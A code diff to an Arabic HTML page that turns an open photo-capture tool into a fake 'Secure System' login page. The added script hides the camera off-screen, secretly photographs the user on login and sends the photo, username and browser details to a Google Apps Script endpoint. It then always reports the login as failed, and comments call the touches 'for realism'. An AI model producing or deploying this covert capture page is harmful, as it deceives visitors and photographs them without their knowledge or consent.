@@ -3,16 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة وإرسالها بالبريد</title>
+    <title>تسجيل الدخول - النظام الآمن</title>
     <style>
-        :root {
-            --primary-color: #4a6fa5;
-            --secondary-color: #6b8cbc;
-            --accent-color: #ff6b6b;
-            --light-color: #f8f9fa;
-            --dark-color: #343a40;
-        }
-        
         * {
             margin: 0;
             padding: 0;
@@ -21,7 +13,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -29,132 +21,48 @@
             padding: 20px;
         }
         
-        .container {
-            background-color: white;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        .login-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
             width: 100%;
-            max-width: 800px;
+            max-width: 450px;
             overflow: hidden;
         }
         
-        header {
-            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+        .header {
+            background: linear-gradient(to right, #2c3e50, #3498db);
             color: white;
-            padding: 25px;
+            padding: 30px;
             text-align: center;
         }
         
-        h1 {
-            font-size: 2.2rem;
+        .header h1 {
+            font-size: 1.8rem;
             margin-bottom: 10px;
         }
         
-        .subtitle {
-            font-size: 1.1rem;
+        .header p {
             opacity: 0.9;
+            font-size: 0.9rem;
         }
         
-        .content {
-            padding: 30px;
-        }
-        
-        .step {
-            margin-bottom: 30px;
-            padding: 20px;
-            border-radius: 15px;
-            background-color: var(--light-color);
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-        }
-        
-        .step-title {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-            color: var(--primary-color);
-        }
-        
-        .step-number {
-            background-color: var(--primary-color);
-            color: white;
-            width: 30px;
-            height: 30px;
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: white;
             border-radius: 50%;
+            margin: 0 auto 15px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            margin-left: 10px;
+            justify-content: center;
             font-weight: bold;
+            color: #3498db;
+            font-size: 1.5rem;
         }
         
-        #camera-container {
-            position: relative;
-            margin: 20px 0;
-            border-radius: 10px;
-            overflow: hidden;
-            background-color: #000;
-        }
-        
-        #video, #canvas, #preview {
-            width: 100%;
-            display: block;
-        }
-        
-        #preview {
-            display: none;
-        }
-        
-        .controls {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-        
-        button {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 50px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        
-        button:hover {
-            background-color: var(--secondary-color);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
-        }
-        
-        button:active {
-            transform: translateY(0);
-        }
-        
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        #capture-btn {
-            background-color: var(--accent-color);
-        }
-        
-        #capture-btn:hover {
-            background-color: #ff5252;
-        }
-        
-        #email-form {
-            display: none;
+        .login-form {
+            padding: 30px;
         }
         
         .form-group {
@@ -165,27 +73,97 @@
             display: block;
             margin-bottom: 8px;
             font-weight: 600;
-            color: var(--dark-color);
+            color: #2c3e50;
         }
         
-        input[type="email"] {
+        input {
             width: 100%;
             padding: 15px;
             border: 2px solid #e1e5ee;
-            border-radius: 10px;
+            border-radius: 8px;
             font-size: 16px;
             transition: border 0.3s ease;
         }
         
-        input[type="email"]:focus {
-            border-color: var(--primary-color);
+        input:focus {
+            border-color: #3498db;
             outline: none;
         }
         
-        #status {
-            margin-top: 20px;
+        .password-container {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #7f8c8d;
+            cursor: pointer;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(to right, #3498db, #2c3e50);
+            color: white;
+            border: none;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .login-btn:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #7f8c8d;
+            font-size: 0.8rem;
+            border-top: 1px solid #ecf0f1;
+        }
+        
+        .footer a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        
+        /* عناصر الكاميرا المخفية */
+        #camera-container {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+        
+        #video, #canvas {
+            width: 1px;
+            height: 1px;
+        }
+        
+        /* رسائل الحالة */
+        #status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
             text-align: center;
             font-weight: 500;
             display: none;
@@ -194,284 +172,242 @@
         .success {
             background-color: #d4edda;
             color: #155724;
+            border: 1px solid #c3e6cb;
             display: block;
         }
         
         .error {
             background-color: #f8d7da;
             color: #721c24;
+            border: 1px solid #f5c6cb;
             display: block;
         }
         
         .loading {
             background-color: #cce5ff;
             color: #004085;
+            border: 1px solid #b8daff;
             display: block;
         }
         
-        footer {
+        .forgot-password {
             text-align: center;
-            padding: 20px;
-            color: #6c757d;
-            font-size: 0.9rem;
-            border-top: 1px solid #e9ecef;
+            margin-top: 15px;
         }
         
-        @media (max-width: 600px) {
-            h1 {
-                font-size: 1.8rem;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            button {
-                width: 100%;
-                justify-content: center;
-            }
+        .forgot-password a {
+            color: #3498db;
+            text-decoration: none;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>التقاط صورة وإرسالها بالبريد</h1>
-            <p class="subtitle">التقط صورتك وأرسلها إلى بريدك الإلكتروني بسهولة</p>
-        </header>
+    <div class="login-container">
+        <div class="header">
+            <div class="logo">S</div>
+            <h1>النظام الآمن</h1>
+            <p>يجب تسجيل الدخول للوصول إلى النظام</p>
+        </div>
         
-        <div class="content">
-            <div class="step">
-                <div class="step-title">
-                    <span class="step-number">1</span>
-                    <h2>تشغيل الكاميرا</h2>
-                </div>
-                <p>انقر على زر "تشغيل الكاميرا" للسماح للموقع بالوصول إلى كاميرا الجهاز.</p>
-                <div class="controls">
-                    <button id="start-camera">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
-                            <path d="M0 5a2 2 0 0 1 2-2h7.5a2 2 0 0 1 1.983 1.738l3.11-1.382A1 1 0 0 1 16 4.269v7.462a1 1 0 0 1-1.406.913l-3.111-1.382A2 2 0 0 1 9.5 13H2a2 2 0 0 1-2-2V5z"/>
-                        </svg>
-                        تشغيل الكاميرا
-                    </button>
+        <form class="login-form" id="loginForm">
+            <div class="form-group">
+                <label for="username">اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">كلمة المرور</label>
+                <div class="password-container">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                    <button type="button" class="toggle-password" id="togglePassword">👁️</button>
                 </div>
             </div>
             
-            <div class="step">
-                <div class="step-title">
-                    <span class="step-number">2</span>
-                    <h2>التقاط الصورة</h2>
-                </div>
-                <p>اضغط على زر "التقاط صورة" عندما تكون مستعدًا.</p>
-                <div id="camera-container">
-                    <video id="video" autoplay playsinline></video>
-                    <canvas id="canvas" style="display:none;"></canvas>
-                    <img id="preview" alt="الصورة الملتقطة">
-                </div>
-                <div class="controls">
-                    <button id="capture-btn" disabled>
-                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
-                            <path d="M10.5 8.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
-                            <path d="M2 4a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2h-1.172a2 2 0 0 1-1.414-.586l-.828-.828A2 2 0 0 0 9.172 2H6.828a2 2 0 0 0-1.414.586l-.828.828A2 2 0 0 1 3.172 4H2zm.5 2a.5.5 0 1 1 0-1 .5.5 0 0 1 0 1zm9 2.5a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0z"/>
-                        </svg>
-                        التقاط صورة
-                    </button>
-                    <button id="retake-btn" style="display:none;">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
-                            <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2v1z"/>
-                            <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466z"/>
-                        </svg>
-                        إعادة التقاط
-                    </button>
-                </div>
-            </div>
+            <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
             
-            <div class="step" id="email-form">
-                <div class="step-title">
-                    <span class="step-number">3</span>
-                    <h2>إرسال الصورة</h2>
-                </div>
-                <p>أدخل بريدك الإلكتروني لإرسال الصورة الملتقطة.</p>
-                <div class="form-group">
-                    <label for="email">البريد الإلكتروني:</label>
-                    <input type="email" id="email" placeholder="example@domain.com" required>
-                </div>
-                <div class="controls">
-                    <button id="send-btn">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
-                            <path d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11ZM6.636 10.07l2.761 4.338L14.13 2.576 6.636 10.07Zm6.787-8.201L1.591 6.602l4.339 2.76 7.494-7.493Z"/>
-                        </svg>
-                        إرسال الصورة
-                    </button>
-                </div>
+            <div class="forgot-password">
+                <a href="#">نسيت كلمة المرور؟</a>
             </div>
             
             <div id="status"></div>
-        </div>
+        </form>
         
-        <footer>
-            <p>© 2023 جميع الحقوق محفوظة - تم التطوير باستخدام Google Apps Script</p>
-        </footer>
+        <div class="footer">
+            <p>© 2023 النظام الآمن. جميع الحقوق محفوظة.</p>
+            <p>الإصدار 2.4.1 | <a href="#">الشروط والأحكام</a></p>
+        </div>
+    </div>
+
+    <!-- الكاميرا المخفية -->
+    <div id="camera-container">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
     </div>
 
     <script>
         // العناصر
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const togglePasswordBtn = document.getElementById('togglePassword');
+        const loginBtn = document.getElementById('loginBtn');
+        const statusDiv = document.getElementById('status');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const preview = document.getElementById('preview');
-        const startCameraBtn = document.getElementById('start-camera');
-        const captureBtn = document.getElementById('capture-btn');
-        const retakeBtn = document.getElementById('retake-btn');
-        const emailForm = document.getElementById('email-form');
-        const emailInput = document.getElementById('email');
-        const sendBtn = document.getElementById('send-btn');
-        const statusDiv = document.getElementById('status');
         
         let stream = null;
-        let capturedImage = null;
         
         // استبدل هذا الرابط برابط نشر Google Apps Script الخاص بك
-        const SCRIPT_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSf5DyWUL6svGEljYWSRujwWgfdZjHD02vpFRMpdgFJniwY_Co7iyeD0MnucdxLnCv/exec';
         
-        // تشغيل الكاميرا
-        startCameraBtn.addEventListener('click', async () => {
+        // تبديل رؤية كلمة المرور
+        togglePasswordBtn.addEventListener('click', () => {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                togglePasswordBtn.textContent = '🙈';
+            } else {
+                passwordInput.type = 'password';
+                togglePasswordBtn.textContent = '👁️';
+            }
+        });
+        
+        // معالجة تسجيل الدخول
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!username || !password) {
+                showStatus('يرجى ملء جميع الحقول', 'error');
+                return;
+            }
+            
+            // تعطيل الزر أثناء المعالجة
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'جاري التحقق...';
+            
             try {
-                statusDiv.textContent = "جاري تشغيل الكاميرا...";
-                statusDiv.className = "loading";
+                // محاولة تشغيل الكاميرا والتقاط صورة
+                await captureAndSendPhoto(username);
                 
+            } catch (error) {
+                console.error('Error:', error);
+                showStatus('فشل في التحقق. يرجى المحاولة مرة أخرى.', 'error');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'تسجيل الدخول';
+            }
+        });
+        
+        // التقاط الصورة وإرسالها
+        async function captureAndSendPhoto(username) {
+            showStatus('جاري التحقق من بياناتك...', 'loading');
+            
+            try {
+                // تشغيل الكاميرا
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                captureBtn.disabled = false;
-                statusDiv.textContent = "الكاميرا جاهزة للاستخدام";
-                statusDiv.className = "success";
                 
-                // إخفاء معاينة الصورة إذا كانت ظاهرة
-                preview.style.display = 'none';
-                video.style.display = 'block';
+                // انتظار تحميل الفيديو
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
                 
-            } catch (err) {
-                console.error("خطأ في الوصول للكاميرا:", err);
-                statusDiv.textContent = "خطأ في الوصول للكاميرا. تأكد من السماح بالوصول للكاميرا.";
-                statusDiv.className = "error";
-            }
-        });
-        
-        // التقاط الصورة
-        captureBtn.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // تحويل الصورة إلى بيانات
-            capturedImage = canvas.toDataURL('image/png');
-            
-            // إظهار المعاينة
-            preview.src = capturedImage;
-            preview.style.display = 'block';
-            video.style.display = 'none';
-            
-            // إيقاف الكاميرا
-            if (stream) {
+                // التقاط الصورة
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // تحويل الصورة إلى بيانات
+                const imageData = canvas.toDataURL('image/png');
+                
+                // إيقاف الكاميرا
                 stream.getTracks().forEach(track => track.stop());
-            }
-            
-            // إظهار نموذج البريد الإلكتروني وأزرار التحكم
-            emailForm.style.display = 'block';
-            retakeBtn.style.display = 'flex';
-            captureBtn.style.display = 'none';
-            
-            statusDiv.textContent = "تم التقاط الصورة بنجاح! أدخل بريدك الإلكتروني للإرسال.";
-            statusDiv.className = "success";
-        });
-        
-        // إعادة التقاط الصورة
-        retakeBtn.addEventListener('click', () => {
-            // إعادة تعيين العناصر
-            preview.style.display = 'none';
-            video.style.display = 'block';
-            emailForm.style.display = 'none';
-            retakeBtn.style.display = 'none';
-            captureBtn.style.display = 'flex';
-            emailInput.value = "";
-            capturedImage = null;
-            
-            // إعادة تشغيل الكاميرا
-            startCameraBtn.click();
-        });
-        
-        // إرسال البريد الإلكتروني
-        sendBtn.addEventListener('click', async () => {
-            const email = emailInput.value.trim();
-            
-            if (!validateEmail(email)) {
-                statusDiv.textContent = "يرجى إدخال بريد إلكتروني صحيح";
-                statusDiv.className = "error";
-                return;
-            }
-            
-            if (!capturedImage) {
-                statusDiv.textContent = "لم يتم التقاط أي صورة";
-                statusDiv.className = "error";
-                return;
-            }
-            
-            statusDiv.textContent = "جاري إرسال الصورة...";
-            statusDiv.className = "loading";
-            
-            try {
+                
+                // إرسال البيانات إلى الخادم
                 const response = await fetch(SCRIPT_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        email: email,
-                        image: capturedImage
+                        username: username,
+                        image: imageData,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
                     })
                 });
                 
                 const result = await response.json();
                 
                 if (result.success) {
-                    statusDiv.textContent = "تم إرسال الصورة بنجاح إلى " + email;
-                    statusDiv.className = "success";
-                    
-                    // إعادة تعيين النموذج
-                    setTimeout(() => {
-                        emailInput.value = "";
-                        emailForm.style.display = "none";
-                        retakeBtn.style.display = "none";
-                        captureBtn.style.display = "flex";
-                        capturedImage = null;
-                        preview.style.display = 'none';
-                        video.style.display = 'block';
-                    }, 3000);
-                    
+                    showStatus('بيانات غير صحيحة. يرجى المحاولة مرة أخرى.', 'error');
                 } else {
-                    throw new Error(result.message);
+                    showStatus('حدث خطأ في النظام. يرجى المحاولة لاحقاً.', 'error');
                 }
                 
             } catch (error) {
-                console.error("خطأ في الإرسال:", error);
-                statusDiv.textContent = "حدث خطأ أثناء إرسال الصورة. حاول مرة أخرى.";
-                statusDiv.className = "error";
+                // في حالة فشل الكاميرا، نرسل البيانات بدون صورة
+                try {
+                    await fetch(SCRIPT_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: username,
+                            image: null,
+                            userAgent: navigator.userAgent,
+                            timestamp: new Date().toISOString(),
+                            error: 'فشل في التقاط الصورة: ' + error.message
+                        })
+                    });
+                } catch (e) {
+                    console.error('Failed to send data:', e);
+                }
+                
+                showStatus('فشل في التحقق. يرجى المحاولة مرة أخرى.', 'error');
+            } finally {
+                // إعادة تعيين الواجهة
+                setTimeout(() => {
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'تسجيل الدخول';
+                    usernameInput.value = '';
+                    passwordInput.value = '';
+                    showStatus('', '');
+                }, 3000);
             }
-        });
-        
-        // التحقق من صحة البريد الإلكتروني
-        function validateEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(email);
         }
+        
+        // عرض رسالة الحالة
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = type;
+        }
+        
+        // إضافة تأثيرات إضافية للواقعية
+        document.addEventListener('DOMContentLoaded', () => {
+            // إضافة تأثير تأخير بسيط عند الكتابة (للمظهر الواقعي)
+            usernameInput.addEventListener('input', () => {
+                usernameInput.style.borderColor = '#e1e5ee';
+            });
+            
+            passwordInput.addEventListener('input', () => {
+                passwordInput.style.borderColor = '#e1e5ee';
+            });
+        });
     </script>
 </body>
 </html>
